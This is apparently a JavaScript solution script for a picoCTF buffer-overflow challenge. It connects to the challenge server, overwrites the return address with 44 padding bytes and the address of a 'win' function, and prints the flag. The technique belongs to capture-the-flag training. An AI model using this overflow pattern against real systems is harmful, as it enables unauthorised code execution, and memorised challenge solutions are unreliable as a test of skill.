import nc from "../nc.js";
import convo from "../convo.js"
import { expectArg } from "../util.js";

const port = expectArg(2, "port") - 0;

const cat = new nc("saturn.picoctf.net", port);

const STACK_SIZE = 44;
const win_addr = 0x080491f6


await cat.open; 
await cat.write("A".repeat(STACK_SIZE));
await cat.write(convo.raw(win_addr))
await cat.write("\n");
await cat.readUntil("...");
await cat.readline();
const flag = await cat.readline();

console.log("[!] " + flag.trim());

await cat.kill();